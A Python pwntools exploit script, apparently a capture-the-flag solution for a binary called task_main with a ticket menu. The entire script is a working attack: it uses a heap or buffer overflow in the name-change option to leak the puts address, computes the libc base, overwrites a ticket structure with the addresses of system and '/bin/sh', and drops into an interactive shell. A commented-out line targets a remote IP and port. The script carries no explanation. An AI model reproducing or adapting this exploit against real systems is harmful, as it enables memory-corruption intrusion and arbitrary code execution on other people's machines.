from pwn import *
#context.log_level='debug'

io=process('./task_main')
#io=remote('49.4.15.125',30175)
libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

def get(b,a):
	io.sendline('1')
	io.sendlineafter("The length of my owner's name:\n",str(b))
	io.sendafter("Give me my owner's name:\n",a)

def open(a):
	io.sendline('2')
	io.sendlineafter("Please tell me which tickets would you want to open?\n",str(a))
	
def change(a,b):
	io.sendline('3')
	io.sendlineafter("Please tell me which tickets would you want to change it's owner's name?\n",str(a))
	io.sendlineafter("The length of my owner's name:",str(len(b)+1))
	io.sendafter("Give me my owner's name:",b)

io.recv()
get(20,'aaaa')
io.recv()
get(20,'bbbb')
io.recv()
change(0,'a'*40)
io.recv()
open(0)
io.recvuntil('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
puts_addr=u64(io.recv(6).ljust(8,'\x00'))
log.success('puts_addr:'+hex(puts_addr))
libc_base=puts_addr-libc.symbols['puts']
log.success('libc_base:'+hex(libc_base))
bin_sh_addr=libc_base+libc.search('/bin/sh\x00').next()
system_addr=libc_base+libc.symbols['system']
pay='a'*0x10+p64(0)+p64(21)+p64(bin_sh_addr)+p64(system_addr)
change(0,pay)
open(1)
#gdb.attach(io)
#pause()
io.interactive()
